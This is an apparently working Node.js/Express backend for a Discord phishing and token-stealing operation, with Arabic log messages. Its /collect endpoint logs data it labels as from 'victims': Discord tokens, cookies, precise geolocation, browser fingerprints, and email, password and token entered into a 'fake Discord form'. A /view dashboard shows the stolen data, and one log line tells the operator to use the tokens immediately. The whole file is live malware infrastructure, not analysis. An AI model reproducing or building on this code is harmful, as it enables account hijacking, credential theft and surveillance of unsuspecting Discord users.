const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

function formatLogEntry(data, ip, userAgent) {
    const lines = [];
    const sep = '═'.repeat(70);

    lines.push(sep);
    lines.push(`📌 بيانات ضحية جديدة`);
    lines.push(`🕒 ${new Date().toISOString()}`);
    lines.push(`🌐 IP: ${ip}`);
    lines.push(`💻 User-Agent: ${userAgent}`);
    lines.push(sep);

    // ===== التوكن أولاً =====
    if (data.discordTokens && data.discordTokens.length > 0) {
        lines.push('\n🔥🔥🔥 تم العثور على توكنات ديسكورد 🔥🔥🔥');
        lines.push(`عدد التوكنات: ${data.discordTokens.length}`);
        data.discordTokens.forEach((t, i) => {
            lines.push(`\n┌─ توكن #${i+1}`);
            lines.push(`│ المصدر: ${t.source}`);
            lines.push(`│ المفتاح: ${t.key}`);
            lines.push(`│ القيمة: ${t.value}`);
            lines.push(`└─`);
        });
        lines.push('\n⚠️ انسخ التوكن واستخدمه فوراً');
        lines.push('🔥'.repeat(20));
    } else {
        lines.push('\n❌ لم يتم العثور على أي توكن ديسكورد');
    }

    // ===== معلومات الجهاز =====
    if (data.device) {
        let d = data.device;
        lines.push('\n💻 معلومات الجهاز:');
        lines.push(`   - نظام التشغيل: ${d.platform || 'غير معروف'}`);
        lines.push(`   - اللغة: ${d.language || 'غير معروف'}`);
        lines.push(`   - الشاشة: ${d.screenWidth || '?'} × ${d.screenHeight || '?'}`);
        lines.push(`   - نسبة البكسل: ${d.pixelRatio || '?'}`);
        lines.push(`   - المنطقة الزمنية: ${d.timezone || 'غير معروف'}`);
        lines.push(`   - المعالجات: ${d.hardwareConcurrency || 'غير معروف'}`);
        lines.push(`   - الرام: ${d.deviceMemory || 'غير معروف'} GB`);
        lines.push(`   - نقاط اللمس: ${d.maxTouchPoints || 0}`);
    }

    // ===== الشبكة =====
    if (data.network && Object.keys(data.network).length > 0) {
        lines.push('\n🌐 معلومات الشبكة:');
        if (data.network.type) lines.push(`   - نوع الاتصال: ${data.network.type}`);
        if (data.network.downlink) lines.push(`   - سرعة التحميل: ${data.network.downlink}`);
        if (data.network.rtt) lines.push(`   - زمن الاستجابة: ${data.network.rtt}`);
    }

    // ===== الخطوط =====
    if (data.installedFonts && data.installedFonts.length > 0) {
        lines.push(`\n🔤 الخطوط المثبتة: ${data.installedFonts.join(', ')}`);
    }

    // ===== بصمة =====
    if (data.canvasFingerprint) {
        lines.push(`\n🎨 بصمة Canvas: ${data.canvasFingerprint}`);
    }
    if (data.webglInfo) {
        lines.push(`🖥️ WebGL: ${data.webglInfo}`);
    }

    // ===== الموقع =====
    if (data.location) {
        if (data.location.lat) {
            lines.push(`\n📍 الموقع الجغرافي:`);
            lines.push(`   - خط العرض: ${data.location.lat}`);
            lines.push(`   - خط الطول: ${data.location.lng}`);
            lines.push(`   - الدقة: ${data.location.accuracy} متر`);
            lines.push(`   - خريطة: https://maps.google.com/?q=${data.location.lat},${data.location.lng}`);
        } else if (data.location.error) {
            lines.push(`\n📍 الموقع: فشل - ${data.location.error}`);
        }
    }

    // ===== الكوكيز =====
    if (data.allCookies) {
        let cookies = data.allCookies.split(';').filter(c => c.trim());
        if (cookies.length > 0) {
            lines.push(`\n🍪 عدد الكوكيز: ${cookies.length}`);
            cookies.slice(0, 10).forEach(c => lines.push(`   🍪 ${c.trim()}`));
            if (cookies.length > 10) lines.push(`   ... و ${cookies.length - 10} كوكيز أخرى`);
        }
    }

    // ===== بيانات النموذج =====
    if (data.discordEmail || data.discordPassword || data.discordToken) {
        lines.push('\n🎯 بيانات من نموذج الديسكورد الوهمي:');
        if (data.discordEmail) lines.push(`   📧 البريد: ${data.discordEmail}`);
        if (data.discordPassword) lines.push(`   🔒 كلمة المرور: ${data.discordPassword}`);
        if (data.discordToken) lines.push(`   🎫 التوكن المدخل: ${data.discordToken}`);
    }

    lines.push('\n' + sep);
    lines.push('🏁 نهاية البيانات');
    lines.push(sep + '\n');

    return lines.join('\n');
}

app.post('/collect', (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || 'غير معروف';
    const text = formatLogEntry(data, ip, ua);
    fs.appendFileSync('data.log', text, 'utf8');
    console.log('✅ تم استقبال بيانات');
    res.sendStatus(200);
});

app.get('/view', (req, res) => {
    if (fs.existsSync('data.log')) {
        const content = fs.readFileSync('data.log', 'utf8');
        res.send(`<html><head><title>البيانات</title><style>
            body { background: #0d1117; color: #e6edf3; font-family: monospace; padding: 30px; }
            pre { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; font-size: 14px; white-space: pre-wrap; word-wrap: break-word; direction: ltr; text-align: left; }
            .token-alert { color: #ff6b6b; font-size: 22px; font-weight: bold; }
        </style></head><body>
            <h1>📊 البيانات المجمعة</h1>
            <div class="token-alert">⚠️ ابحث عن 🔥🔥🔥 للتوكنات</div>
            <pre>${content}</pre>
            <p>🔄 تحديث كل 30 ثانية | <a href="/view">تحديث يدوي</a></p>
            <script>setTimeout(()=>location.reload(), 30000);</script>
        </body></html>`);
    } else {
        res.send('📭 لا توجد بيانات بعد.');
    }
});

app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
});
